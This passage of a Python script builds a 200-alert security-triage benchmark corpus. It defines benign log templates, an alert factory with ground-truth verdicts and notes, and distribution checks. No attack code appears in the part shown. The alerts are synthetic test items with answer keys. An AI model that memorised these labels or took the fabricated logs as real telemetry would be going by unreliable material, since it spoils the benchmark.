                f"{_ts()} {host} docker[{_pid()}]: "
                f"Pull complete: 4 layers, 40MB "
                f"registry=registry-1.docker.io"
            ),
            prompt="Investigate software download from external registry on {host}",
            src_ip=src, dst_ip="104.16.132.229", hostname=host,
            verdict="benign", iocs=[], mitre=[],
            risk_range=[0, 5], difficulty="easy",
            notes="Docker pulling official nginx image from Docker Hub — standard container deployment",
            severity="informational",
        ),
        # SSL certificate check
        lambda: _make_alert(
            alert_type="reconnaissance",
            raw_log="\n".join([
                f"{_ts()} monitoring-01 check_ssl[{_pid()}]: "
                f"OK - Certificate for {d} expires in {random.randint(30,365)} days"
                for d in _picks(LEGITIMATE_DOMAINS, 4)
            ]),
            prompt="Investigate SSL certificate probing against multiple domains",
            src_ip="10.0.3.15", dst_ip=_pick(INTERNAL_IPS), hostname="monitoring-01",
            verdict="benign", iocs=[], mitre=[],
            risk_range=[0, 5], difficulty="easy",
            notes="Nagios SSL certificate expiry monitoring — standard TLS health check",
            severity="informational",
        ),
        # Printer activity
        lambda: _make_alert(
            alert_type="data_exfiltration",
            raw_log=(
                f"{_ts()} {host} cups[{_pid()}]: "
                f"Job 4521 queued on HP_LaserJet_4th_Floor "
                f"user={user} pages=15 "
                f"title='Monthly_Report.pdf' "
                f"size=2MB"
            ),
            prompt="Investigate data output to network printer",
            src_ip=src, dst_ip="192.168.1.200", hostname=host,
            verdict="benign", iocs=[], mitre=[],
            risk_range=[0, 5], difficulty="easy",
            notes="User printing monthly report — normal office activity",
            severity="informational",
        ),
        # Kerberos ticket renewal
        lambda: _make_alert(
            alert_type="brute_force",
            raw_log=(
                f"{_ts()} dc-01 security[{_pid()}]: 4768 "
                f"Kerberos TGT requested: {user}@COMPANY.LOCAL "
                f"src={src} encryption=AES256 status=SUCCESS\n"
                f"{_ts()} dc-01 security[{_pid()}]: 4769 "
                f"Kerberos service ticket requested: "
                f"krbtgt/COMPANY.LOCAL user={user} "
                f"encryption=AES256 status=SUCCESS"
            ),
            prompt="Investigate Kerberos authentication activity for {user}",
            src_ip=src, dst_ip="10.0.2.100", hostname="dc-01",
            verdict="benign", iocs=[], mitre=[],
            risk_range=[0, 5], difficulty="easy",
            notes="Normal Kerberos TGT and service ticket request — standard Windows authentication",
            severity="informational",
        ),
    ]
    return variants[idx % len(variants)]()


# ---------------------------------------------------------------------------
# Alert factory
# ---------------------------------------------------------------------------

def _make_alert(
    alert_type: str,
    raw_log: str,
    prompt: str,
    src_ip: str,
    dst_ip: str,
    hostname: str,
    verdict: str,
    iocs: list,
    mitre: list,
    risk_range: list,
    difficulty: str,
    notes: str,
    severity: str = "medium",
) -> dict:
    alert_id = _next_id(verdict.upper()[:2])
    return {
        "id": alert_id,
        "task_type": alert_type,
        "severity": severity,
        "siem_event": {
            "raw_log": raw_log,
            "source_ip": src_ip,
            "destination_ip": dst_ip,
            "hostname": hostname,
            "timestamp": _ts(),
            "alert_type": alert_type,
        },
        "prompt": prompt,
        "ground_truth": {
            "verdict": verdict,
            "iocs": iocs,
            "risk_range": risk_range,
            "mitre_techniques": mitre,
            "difficulty": difficulty,
            "notes": notes,
        },
    }


# ---------------------------------------------------------------------------
# Corpus builder
# ---------------------------------------------------------------------------

TP_GENERATORS = {
    "brute_force": _gen_tp_brute_force,
    "c2_beacon": _gen_tp_c2_beacon,
    "lateral_movement": _gen_tp_lateral_movement,
    "phishing": _gen_tp_phishing,
    "ransomware": _gen_tp_ransomware,
    "malware": _gen_tp_malware,
    "data_exfiltration": _gen_tp_data_exfiltration,
    "privilege_escalation": _gen_tp_privilege_escalation,
    "reconnaissance": _gen_tp_reconnaissance,
    "persistence": _gen_tp_persistence,
    "defense_evasion": _gen_tp_defense_evasion,
}


def build_corpus(seed: int = 42) -> list:
    """Build the 200-alert corpus.

    Distribution: 55 TP, 55 FP, 50 suspicious, 40 benign.
    """
    random.seed(seed)
    corpus = []

    # --- 55 True Positives: 5 per alert type (11 types x 5 = 55) ---
    difficulties = ["easy", "medium", "hard", "easy", "medium"]
    for alert_type, gen_fn in TP_GENERATORS.items():
        for diff in difficulties:
            corpus.append(gen_fn(diff))

    # --- 55 False Positives: 20 from templates + 35 additional ---
    for fp_fn in FP_TEMPLATES:
        corpus.append(fp_fn())
    for i in range(35):
        corpus.append(_gen_additional_fp(i))

    # --- 50 Suspicious: 10 from base pool + 40 additional ---
    for susp_fn in SUSPICIOUS_GENERATORS:
        corpus.append(susp_fn())
    for i in range(40):
        corpus.append(_gen_additional_suspicious(i))

    # --- 40 Benign: 10 from base pool + 30 additional ---
    for ben_fn in BENIGN_GENERATORS:
        corpus.append(ben_fn())
    for i in range(30):
        corpus.append(_gen_additional_benign(i))

    # Shuffle so verdicts are not grouped
    random.shuffle(corpus)

    return corpus


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    corpus = build_corpus()

    # Validate distribution
    verdicts = [a["ground_truth"]["verdict"] for a in corpus]
    total = len(corpus)
    print(f"Corpus size: {total}")
    assert total == 200, f"Expected 200 alerts, got {total}"

    counts = {}
    for v in ["true_positive", "false_positive", "suspicious", "benign"]:
        c = verdicts.count(v)
        counts[v] = c
        print(f"  {v}: {c}")
    assert counts["true_positive"] == 55
    assert counts["false_positive"] == 55
    assert counts["suspicious"] == 50
    assert counts["benign"] == 40

    # Validate TP alert type coverage
    tp_types = set()
    for a in corpus:
        if a["ground_truth"]["verdict"] == "true_positive":
            tp_types.add(a["task_type"])
    print(f"\nTP alert types covered: {len(tp_types)}/11")
    for t in sorted(tp_types):
        tp_count = sum(
            1 for a in corpus
            if a["ground_truth"]["verdict"] == "true_positive" and a["task_type"] == t
        )
        print(f"  {t}: {tp_count}")
    assert len(tp_types) == 11, f"Expected 11 alert types, got {len(tp_types)}"

    # Difficulty breakdown
    print("\nDifficulty breakdown:")
    for d in ["easy", "medium", "hard"]:
        c = sum(1 for a in corpus if a["ground_truth"]["difficulty"] == d)
        print(f"  {d}: {c}")

    # Unique IDs check
    ids = [a["id"] for a in corpus]
    assert len(ids) == len(set(ids)), "Duplicate alert IDs found!"
    print(f"\nAll {len(ids)} alert IDs are unique.")

    # Save corpus
    out_dir = Path(__file__).parent
    output_path = out_dir / "corpus_200.json"
    with open(output_path, "w") as f:
        json.dump({"version": "1.0", "generated": "2026-03-21", "total": total, "alerts": corpus}, f, indent=2)
    print(f"\nSaved corpus to {output_path}")

    # Generate summary
    summary_path = out_dir / "corpus_summary.md"
    with open(summary_path, "w") as f:
        f.write("# ZOVARK Benchmark Corpus — 200 Alerts\n\n")
        f.write(f"Generated: 2026-03-21\n\n")
        f.write("## Distribution\n\n")
        f.write("| Verdict | Count |\n")
        f.write("|---------|-------|\n")
        for v in ["true_positive", "false_positive", "suspicious", "benign"]:
            f.write(f"| {v} | {counts[v]} |\n")
        f.write(f"| **Total** | **{total}** |\n\n")

        f.write("## True Positive Coverage (11 alert types)\n\n")
        f.write("| Alert Type | Count |\n")
        f.write("|-----------|-------|\n")
        for t in sorted(tp_types):
            tp_count = sum(
                1 for a in corpus
                if a["ground_truth"]["verdict"] == "true_positive" and a["task_type"] == t
            )
            f.write(f"| {t} | {tp_count} |\n")

        f.write("\n## Difficulty Distribution\n\n")
        f.write("| Difficulty | Count |\n")
        f.write("|-----------|-------|\n")
        for d in ["easy", "medium", "hard"]:
            c = sum(1 for a in corpus if a["ground_truth"]["difficulty"] == d)
            f.write(f"| {d} | {c} |\n")

        f.write("\n## False Positive Scenarios\n\n")
        fp_alerts = [a for a in corpus if a["ground_truth"]["verdict"] == "false_positive"]
        for i, a in enumerate(fp_alerts[:20], 1):
            f.write(f"{i}. **{a['task_type']}**: {a['ground_truth']['notes']}\n")

        f.write("\n## Suspicious Scenarios\n\n")
        susp_alerts = [a for a in corpus if a["ground_truth"]["verdict"] == "suspicious"]
        for i, a in enumerate(susp_alerts[:15], 1):
            f.write(f"{i}. **{a['task_type']}**: {a['ground_truth']['notes']}\n")

    print(f"Saved summary to {summary_path}")


if __name__ == "__main__":
    main()
